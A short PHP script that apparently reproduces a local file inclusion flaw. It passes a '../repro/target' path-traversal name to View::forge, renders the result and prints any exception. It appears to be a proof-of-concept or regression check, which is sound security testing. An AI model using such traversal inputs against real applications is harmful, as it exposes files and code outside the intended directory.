<?php
require 'repro/bootstrap.php';

echo "Testing LFI...\n";

try {
    // Try to include repro/target.php which is outside of views/
    // Relative path from views/ directory in COREPATH
    // COREPATH is root. views/ is in root.
    // So ../repro/target should reach root/repro/target.php
    $view = \View::forge('../repro/target');
    echo "View created.\n";
    echo "Rendering view...\n";
    echo $view->render();
    echo "\n";
} catch (\Exception $e) {
    echo "Exception: " . $e->getMessage() . "\n";
    echo "Trace:\n" . $e->getTraceAsString() . "\n";
}
